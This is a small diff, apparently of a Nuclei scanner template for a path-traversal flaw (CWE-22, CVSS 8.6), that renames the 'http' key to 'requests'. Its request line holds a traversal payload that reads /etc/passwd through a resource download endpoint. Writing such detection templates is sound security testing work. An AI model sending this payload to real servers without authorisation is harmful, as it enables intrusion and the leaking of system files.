@@ -13,7 +13,7 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd"
